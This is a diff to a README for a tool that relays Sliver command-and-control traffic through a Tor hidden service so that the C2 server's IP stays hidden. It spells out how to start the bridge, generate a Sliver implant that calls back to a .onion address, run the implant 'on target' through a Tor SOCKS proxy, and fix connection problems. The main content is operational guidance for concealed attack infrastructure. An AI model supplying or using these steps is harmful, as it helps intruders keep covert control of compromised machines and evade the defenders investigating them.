@@ -11,11 +11,18 @@ sliver server <---> proxy <---> tor hidden service <---> implant
    :8443           :8080          xyz.onion              (via tor)
 ```
 
+## why use this
+
+- your c2 server ip stays hidden behind tor
+- implants only know the .onion address, not your real ip
+- works with stock sliver, no modifications needed
+- simple python setup, no go compilation required
+
 ## requirements
 
 - python 3.8+
 - tor (apt install tor)
-- sliver
+- sliver (https://sliver.sh)
 
 ## install
 
@@ -43,26 +50,84 @@ sudo systemctl stop tor
 sliver-tor-bridge start --sliver-port 8443
 ```
 
+output will show something like:
+
+```
+[+] Tor started successfully!
+[+] Hidden Service: http://abc123xyz.onion
+[+] Bridge is READY!
+```
+
 wait for the .onion address, then generate an implant:
 
 ```
-sliver > generate --http http://YOUR_ONION.onion --os linux --save /tmp/implant
+sliver > generate --http http://abc123xyz.onion --os linux --save /tmp/implant
 ```
 
-## options
+run the implant on target (needs tor):
 
 ```
+HTTP_PROXY=socks5h://127.0.0.1:9050 ./implant
+```
+
+## cli options
+
+```
+sliver-tor-bridge start [OPTIONS]
+
 --sliver-port    sliver https port (default 8443)
 --tor-port       tor socks port (default 9050)
 --service-port   hidden service port (default 80)
 -c, --config     config file path
 ```
 
+other commands:
+
+```
+sliver-tor-bridge status    # check if hidden service is running
+sliver-tor-bridge stop      # clean up hidden service directory
+```
+
+## how it works
+
+1. tor manager starts a tor process and creates a hidden service
+2. hidden service points to localhost:8080 (the proxy)
+3. flask proxy listens on 8080 and forwards requests to sliver at localhost:8443
+4. sliver handles implant communication normally
+
+the bridge sits in the middle and relays traffic. sliver thinks its getting normal https connections. the implant thinks its talking to a normal http server.
+
 ## docker
 
 ```
 docker-compose up -d
+docker-compose logs -f
 ```
+
+## testing
+
+```
+pip install pytest
+pytest tests/
+```
+
+## files
+
+```
+sliver_tor_bridge/
+  cli.py          # command line interface
+  tor_manager.py  # starts tor and creates hidden service
+  proxy.py        # flask app that forwards to sliver
+  config.py       # configuration handling
+```
+
+## troubleshooting
+
+**tor wont start**: make sure system tor is stopped (`sudo systemctl stop tor`)
+
+**connection timeout**: tor bootstrap can take 1-3 minutes, wait for 100%
+
+**implant not connecting**: make sure implant has tor access (socks proxy on 9050)
 
 ## license
 
